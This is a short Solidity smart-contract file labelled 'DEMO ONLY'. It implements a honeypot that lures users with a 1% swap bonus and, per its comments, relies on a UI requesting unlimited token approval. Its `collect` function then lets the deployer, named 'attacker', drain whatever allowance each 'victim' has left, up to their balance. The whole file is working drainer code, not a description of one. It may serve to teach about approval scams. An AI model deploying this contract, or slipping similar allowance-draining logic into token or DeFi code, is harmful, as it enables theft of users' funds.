// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

/// @notice DEMO ONLY. A trade that looks profitable (+1% bonus) but whose UI asks for an unlimited
///         approval. The approval is left behind, and `collect` later drains it to the deployer.
contract HoneypotWrapper {
    using SafeERC20 for IERC20;

    address public immutable attacker;

    constructor() {
        attacker = msg.sender;
    }

    /// @notice Pulls `amountIn` and pays back `amountIn` + 1% from reserves. Looks great.
    function swapWithBonus(address token, uint256 amountIn) external {
        IERC20(token).safeTransferFrom(msg.sender, address(this), amountIn);
        IERC20(token).safeTransfer(msg.sender, amountIn + amountIn / 100);
    }

    /// @notice The trap: take everything the victim still allows.
    function collect(address token, address victim) external {
        require(msg.sender == attacker, "not attacker");
        uint256 allowed = IERC20(token).allowance(victim, address(this));
        uint256 bal = IERC20(token).balanceOf(victim);
        IERC20(token).safeTransferFrom(victim, attacker, allowed < bal ? allowed : bal);
    }
}
